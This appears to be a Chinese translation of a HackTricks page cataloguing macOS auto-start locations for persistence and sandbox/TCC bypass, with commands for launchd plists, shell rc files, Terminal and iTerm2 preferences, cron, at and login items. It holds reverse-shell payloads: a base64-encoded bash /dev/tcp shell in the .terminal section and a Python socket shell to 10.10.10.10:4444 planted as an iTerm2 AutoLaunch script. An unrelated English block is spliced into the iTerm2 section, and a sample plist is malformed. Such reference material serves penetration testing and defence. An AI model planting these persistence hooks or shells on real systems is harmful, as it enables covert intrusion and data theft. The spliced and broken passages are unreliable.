# macOS自动启动

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

本节内容主要基于博客系列[**超越传统的LaunchAgents**](https://theevilbit.github.io/beyond/)，旨在添加**更多自动启动位置**（如果可能的话），指出**哪些技术仍然适用**于最新版本的macOS（13.4），并指定所需的**权限**。

## 沙盒绕过

{% hint style="success" %}
在这里，您可以找到对**沙盒绕过**有用的启动位置，允许您通过**将其写入文件**并**等待**一个非常**常见的** **操作**，一定的**时间**或通常可以在沙盒内执行的**操作**，而无需root权限。
{% endhint %}

### Launchd

- 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
- TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/Library/LaunchAgents`**
  - **触发器**：重启
  - 需要Root权限
- **`/Library/LaunchDaemons`**
  - **触发器**：重启
  - 需要Root权限
- **`/System/Library/LaunchAgents`**
  - **触发器**：重启
  - 需要Root权限
- **`/System/Library/LaunchDaemons`**
  - **触发器**：重启
  - 需要Root权限
- **`~/Library/LaunchAgents`**
  - **触发器**：重新登录
- **`~/Library/LaunchDemons`**
  - **触发器**：重新登录

{% hint style="success" %}
有趣的是，**`launchd`**在Mach-o部分`__Text.__config`中嵌入了一个属性列表，其中包含其他众所周知的服务，launchd必须启动这些服务。此外，这些服务可以包含`RequireSuccess`、`RequireRun`和`RebootOnSuccess`，这意味着它们必须运行并成功完成。

当然，由于代码签名，它无法被修改。
{% endhint %}

#### 描述和利用

**`launchd`**是由OX S内核在启动时执行的**第一个** **进程**，也是在关机时完成的最后一个进程。它应该始终具有**PID 1**。此进程将**读取和执行**在以下**ASEP** **plist**中指示的配置：

- `/Library/LaunchAgents`：由管理员安装的每个用户代理
- `/Library/LaunchDaemons`：由管理员安装的系统范围守护程序
- `/System/Library/LaunchAgents`：由Apple提供的每个用户代理
- `/System/Library/LaunchDaemons`：由Apple提供的系统范围守护程序

用户登录时，位于`/Users/$USER/Library/LaunchAgents`和`/Users/$USER/Library/LaunchDemons`中的plist将以**已登录用户的权限**启动。

**代理和守护程序之间的主要区别在于代理在用户登录时加载，而守护程序在系统启动时加载**（因为有些服务如ssh需要在任何用户访问系统之前执行）。此外，代理可能使用GUI，而守护程序需要在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
有些情况下，需要在用户登录之前执行代理，这些被称为**PreLoginAgents**。例如，这对于在登录时提供辅助技术非常有用。它们也可以在`/Library/LaunchAgents`中找到（查看[**这里**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)一个示例）。

{% hint style="info" %}
新的守护程序或代理配置文件将在**下次重启后加载**，或使用`launchctl load <target.plist>`。也可以使用`launchctl -F <file>`加载没有扩展名的.plist文件（但这些plist文件在重启后不会自动加载）。\
也可以使用`launchctl unload <target.plist>`来**卸载**（指向它的进程将被终止）。

为了**确保**没有**任何东西**（如覆盖）**阻止**一个**代理**或**守护程序** **运行**，运行：`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

列出当前用户加载的所有代理和守护程序：
```bash
launchctl list
```
{% hint style="warning" %}
如果一个 plist 文件是用户所有的，即使它在守护程序系统范围的文件夹中，**任务将作为用户而不是作为 root 执行**。这可以防止一些特权升级攻击。
{% endhint %}

#### 关于 launchd 的更多信息

**`launchd`** 是从 **内核** 启动的 **第一个**用户模式进程。进程启动必须是 **成功的**，它 **不能退出或崩溃**。甚至对一些 **终止信号** 也有 **保护**。

`launchd` 要做的第一件事情之一是 **启动** 所有的 **守护程序**，比如：

* 基于时间执行的 **定时守护程序**：
  * atd (`com.apple.atrun.plist`)：具有 30 分钟的 `StartInterval`
  * crond (`com.apple.systemstats.daily.plist`)：具有 `StartCalendarInterval` 在 00:15 启动
* 像这样的 **网络守护程序**：
  * `org.cups.cups-lpd`：在 TCP 上监听（`SockType: stream`），使用 `SockServiceName: printer`
  * &#x20;SockServiceName 必须是 `/etc/services` 中的端口或服务
  * `com.apple.xscertd.plist`：在端口 1640 上的 TCP 上监听
* 当指定路径发生变化时执行的 **路径守护程序**：
  * `com.apple.postfix.master`：检查路径 `/etc/postfix/aliases`
* **IOKit 通知守护程序**：
  * `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach 端口**：
  * `com.apple.xscertd-helper.plist`：在 `MachServices` 条目中指示名称 `com.apple.xscertd.helper`
* **UserEventAgent**：
  * 这与前面的不同。它使 launchd 响应特定事件生成应用程序。但在这种情况下，涉及的主要二进制文件不是 `launchd` 而是 `/usr/libexec/UserEventAgent`。它从 SIP 受限制的文件夹 `/System/Library/UserEventPlugins/` 中加载插件，其中每个插件在 `XPCEventModuleInitializer` 键中指示其初始化器，或者在旧插件的情况下，在其 `Info.plist` 的 `CFPluginFactories` 字典下的键 `FB86416D-6164-2070-726F-70735C216EC0` 中指示其初始化器。

### shell 启动文件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* TCC 绕过：[✅](https://emojipedia.org/check-mark-button)
* 但是你需要找到一个具有 TCC 绕过的应用程序，执行加载这些文件的 shell

#### 位置

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
  * **触发**：使用 zsh 打开终端
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **触发**：使用 zsh 打开终端
  * 需要 root 权限
* **`~/.zlogout`**
  * **触发**：使用 zsh 退出终端
* **`/etc/zlogout`**
  * **触发**：使用 zsh 退出终端
  * 需要 root 权限
* 可能还有更多在：**`man zsh`**
* **`~/.bashrc`**
  * **触发**：使用 bash 打开终端
* `/etc/profile`（未起作用）
* `~/.profile`（未起作用）
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **触发**：预期与 xterm 触发，但 **未安装**，即使安装后也会出现此错误：xterm: `DISPLAY is not set`

#### 描述与利用

当初始化 shell 环境（如 `zsh` 或 `bash`）时，**会运行某些启动文件**。macOS 目前使用 `/bin/zsh` 作为默认 shell。当启动终端应用程序或通过 SSH 访问设备时，将自动访问此 shell。虽然 macOS 中也存在 `bash` 和 `sh`，但需要显式调用才能使用。

我们可以通过 **`man zsh`** 阅读 zsh 的 man 页面，其中有关启动文件的详细描述。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

{% hint style="danger" %}
配置指定的利用方式，注销并重新登录，甚至重新启动都无法让我执行该应用程序。（应用程序未被执行，也许需要在执行这些操作时运行）
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* TCC绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **触发器**：重新启动时重新打开应用程序

#### 描述和利用

所有要重新打开的应用程序都在 plist 文件 `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中。

因此，要让重新打开的应用程序启动您自己的应用程序，您只需要**将您的应用程序添加到列表中**。

UUID 可以在列出该目录或使用 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 找到。

要检查将要重新打开的应用程序，您可以执行以下操作：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要**将应用程序添加到此列表**，您可以使用：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### 终端偏好设置

* 有用以绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* TCC绕过：[✅](https://emojipedia.org/check-mark-button)
* 终端用于拥有用户的FDA权限

#### 位置

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **触发器**：打开终端

#### 描述与利用

在**`~/Library/Preferences`**中存储了用户在应用程序中的偏好设置。其中一些偏好设置可以包含配置以**执行其他应用程序/脚本**。

例如，终端可以在启动时执行一个命令：

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

这个配置反映在文件**`~/Library/Preferences/com.apple.Terminal.plist`**中，如下所示：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
所以，如果系统中终端的偏好设置的 plist 文件被覆盖，那么可以使用 **`open`** 功能来**打开终端并执行该命令**。

您可以通过以下命令行添加此功能：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### 终端脚本 / 其他文件扩展名

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)
* TCC绕过：[✅](https://emojipedia.org/check-mark-button)
* 终端用于拥有用户的FDA权限

#### 位置

* **任何地方**
* **触发器**：打开终端

#### 描述 & 利用

如果您创建一个[**`.terminal`**脚本](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)并打开它，**终端应用程序**将自动调用以执行其中指定的命令。如果终端应用程序具有一些特殊权限（如TCC），您的命令将以这些特殊权限运行。

尝试使用：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### 音频插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* 用于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)
* TCC绕过: [🟠](https://emojipedia.org/large-orange-circle)
* 您可能会获得一些额外的TCC访问权限

#### 位置

* **`/Library/Audio/Plug-Ins/HAL`**
* 需要Root权限
* **触发器**: 重新启动coreaudiod或计算机
* **`/Library/Audio/Plug-ins/Components`**
* 需要Root权限
* **触发器**: 重新启动coreaudiod或计算机
* **`~/Library/Audio/Plug-ins/Components`**
* **触发器**: 重新启动coreaudiod或计算机
* **`/System/Library/Components`**
* 需要Root权限
* **触发器**: 重新启动coreaudiod或计算机

#### 描述

根据先前的写作，可以**编译一些音频插件**并加载它们。

### QuickLook插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* 用于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)
* TCC绕过: [🟠](https://emojipedia.org/large-orange-circle)
* 您可能会获得一些额外的TCC访问权限

#### 位置

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

当您**触发文件的预览**（在Finder中选择文件后按空格键）并安装了**支持该文件类型**的插件时，QuickLook插件可以被执行。

您可以编译自己的QuickLook插件，将其放在上述位置之一以加载它，然后转到支持的文件并按空格键触发它。

### ~~登录/注销挂钩~~

{% hint style="danger" %}
对我来说这不起作用，无论是用户LoginHook还是root LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* 用于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)
* TCC绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* 您需要能够执行类似`defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`的命令
* 位于`~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可用于在用户登录时执行命令。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
这个设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` 文件中。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
要删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
根用户的启动位置存储在**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## 条件沙盒绕过

{% hint style="success" %}
在这里，您可以找到有用于**绕过沙盒**的启动位置，允许您通过**将内容写入文件**并**期望不会出现非常普遍的条件**，比如特定的**已安装程序，"不常见"用户**操作或环境来简单执行某些操作。
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* 用于绕过沙盒的有用性: [✅](https://emojipedia.org/check-mark-button)
* 但是，您需要能够执行 `crontab` 二进制文件
* 或者是 root
* TCC 绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 需要 root 权限才能直接写入。如果可以执行 `crontab <file>` 则不需要 root 权限
* **触发器**: 取决于 cron 作业

#### 描述和利用

列出**当前用户**的 cron 作业：
```bash
crontab -l
```
您还可以查看**`/usr/lib/cron/tabs/`**和**`/var/at/tabs/`**中用户的所有cron作业（需要root权限）。

在MacOS中，可以找到几个以**特定频率**执行脚本的文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在这里你可以找到常规的**cron** **任务**，**at** **任务**（不太常用），以及**periodic** **任务**（主要用于清理临时文件）。 比如，可以使用`periodic daily`来执行每日的周期性任务。

要通过编程方式添加**用户cron任务**，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* 有用于绕过沙盒: [✅](https://emojipedia.org/check-mark-button)
* TCC绕过: [✅](https://emojipedia.org/check-mark-button)
* iTerm2曾经被授予TCC权限

#### 位置

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **触发器**: 打开 iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **触发器**: 打开 iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **触发器**: 打开 iTerm

#### 描述 & Exploitation

存储在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 中的脚本将被执行。例如:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
### macOS Auto Start Locations

#### Launch Agents

Launch Agents are used to run commands when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.

#### Launch Daemons

Launch Daemons are used to run commands at system startup. They are stored in `/Library/LaunchDaemons/`.

#### Login Items

Login Items are applications that open when a user logs in. They are managed in `System Preferences > Users & Groups > Login Items`.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也会被执行：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2偏好设置位于**`~/Library/Preferences/com.googlecode.iterm2.plist`**中，可以在打开iTerm2终端时**指示要执行的命令**。

此设置可以在iTerm2设置中配置：

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

命令会反映在偏好设置中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
您可以设置要执行的命令为：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
很可能有**其他方法滥用 iTerm2 首选项**来执行任意命令。
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* 用于绕过沙盒的有用性: [✅](https://emojipedia.org/check-mark-button)
* 但必须安装 xbar
* TCC 绕过: [✅](https://emojipedia.org/check-mark-button)
* 它请求辅助功能权限

#### 位置

* **`~/Library/Application\ Support/xbar/plugins/`**
* **触发器**: 一旦 xbar 被执行

#### 描述

如果安装了流行的程序 [**xbar**](https://github.com/matryer/xbar)，则可以在 **`~/Library/Application\ Support/xbar/plugins/`** 中编写一个 shell 脚本，当 xbar 启动时将被执行:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* 用于绕过沙盒: [✅](https://emojipedia.org/check-mark-button)
* 但必须安装 Hammerspoon
* TCC 绕过: [✅](https://emojipedia.org/check-mark-button)
* 它请求辅助功能权限

#### 位置

* **`~/.hammerspoon/init.lua`**
* **触发器**: 一旦启动 Hammerspoon

#### 描述

[Hammerspoon](https://github.com/Hammerspoon/hammerspoon) 作为 macOS 的自动化平台，利用 LUA 脚本语言进行操作。值得注意的是，它支持完整 AppleScript 代码的集成和 shell 脚本的执行，显著增强了其脚本编写能力。

该应用程序寻找一个单一文件，`~/.hammerspoon/init.lua`，并在启动时执行该脚本。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* 但必须安装BetterTouchTool
* TCC绕过：[✅](https://emojipedia.org/check-mark-button)
* 它请求Automation-Shortcuts和Accessibility权限

#### 位置

* `~/Library/Application Support/BetterTouchTool/*`

这个工具允许指定应用程序或脚本在按下某些快捷键时执行。攻击者可能能够配置自己的**快捷键和操作以在数据库中执行任意代码**，使其执行任意代码（快捷键可能只是按下一个键）。

### Alfred

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* 但必须安装Alfred
* TCC绕过：[✅](https://emojipedia.org/check-mark-button)
* 它请求Automation、Accessibility甚至Full-Disk访问权限

#### 位置

* `???`

它允许创建工作流，当满足某些条件时可以执行代码。潜在地，攻击者可以创建一个工作流文件并让Alfred加载它（需要付费版本才能使用工作流）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* 但需要启用和使用ssh
* TCC绕过：[✅](https://emojipedia.org/check-mark-button)
* SSH用于具有FDA访问权限

#### 位置

* **`~/.ssh/rc`**
* **触发器**：通过ssh登录
* **`/etc/ssh/sshrc`**
* 需要Root权限
* **触发器**：通过ssh登录

{% hint style="danger" %}
要打开ssh需要完全磁盘访问权限：
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### 描述 & 利用

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置了 `PermitUserRC no`，当用户通过 SSH 登录时，将执行脚本 `/etc/ssh/sshrc` 和 `~/.ssh/rc`。

### **登录项**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* 但需要使用参数执行 `osascript`
* TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **触发：** 登录
* 利用载荷存储调用 **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **触发：** 登录
* 需要 root 权限

#### 描述

在系统偏好设置 -> 用户与组 -> **登录项** 中，您可以找到用户登录时要执行的 **项目**。\
可以通过命令行列出、添加和删除它们：
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**登录项**也可以使用API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) 进行指示，该API将在**`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**中存储配置。

### 作为登录项的ZIP

(查看关于登录项的前一节，这是一个扩展)

如果将一个**ZIP**文件存储为**登录项**，**`Archive Utility`**将打开它，例如，如果ZIP文件存储在**`~/Library`**中，并包含带有后门的文件夹**`LaunchAgents/file.plist`**，那么该文件夹将被创建（默认情况下不会创建），并且plist将被添加，因此下次用户再次登录时，**plist中指定的后门将被执行**。

另一个选项是在用户主目录中创建文件**`.bash_profile`**和**`.zshenv`**，因此如果LaunchAgents文件夹已经存在，这种技术仍将起作用。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* 用于绕过沙盒的有用工具: [✅](https://emojipedia.org/check-mark-button)
* 但您需要**执行** **`at`** 并且它必须是**启用**的
* TCC绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* 需要**执行** **`at`** 并且它必须是**启用**的

#### **描述**

`at`任务旨在**安排一次性任务**在特定时间执行。与cron作业不同，`at`任务在执行后会自动删除。需要注意的是，这些任务在系统重新启动后仍然存在，这在某些情况下可能会被视为潜在的安全问题。

默认情况下它们是**禁用**的，但**root**用户可以使用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在1小时内创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
检查作业队列使用 `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
以上我们可以看到两个已安排的任务。我们可以使用 `at -c JOBNUMBER` 命令打印任务的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
如果未启用 AT 任务，则创建的任务将不会被执行。
{% endhint %}

**作业文件**可以在 `/private/var/at/jobs/` 找到
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
文件名包含队列、作业编号和计划运行时间。例如，让我们看看 `a0001a019bdcd2`。

- `a` - 这是队列
- `0001a` - 十六进制的作业编号，`0x1a = 26`
- `019bdcd2` - 十六进制的时间。它表示自纪元以来经过的分钟数。`0x019bdcd2` 在十进制中是 `26991826`。如果我们将其乘以 60，我们得到 `1619509560`，即 `GMT: 2021年4月27日，星期二 7:46:00`。

如果我们打印作业文件，我们会发现它包含了我们使用 `at -c` 得到的相同信息。

### 文件夹操作

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- 有用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
- 但您需要能够调用带参数的 `osascript` 来联系 **`System Events`** 以配置文件夹操作
- TCC绕过：[🟠](https://emojipedia.org/large-orange-circle)
- 它具有一些基本的TCC权限，如桌面、文稿和下载

#### 位置

- **`/Library/Scripts/Folder Action Scripts`**
- 需要 root 权限
- **触发器**：访问指定文件夹
- **`~/Library/Scripts/Folder Action Scripts`**
- **触发器**：访问指定文件夹

#### 描述和利用

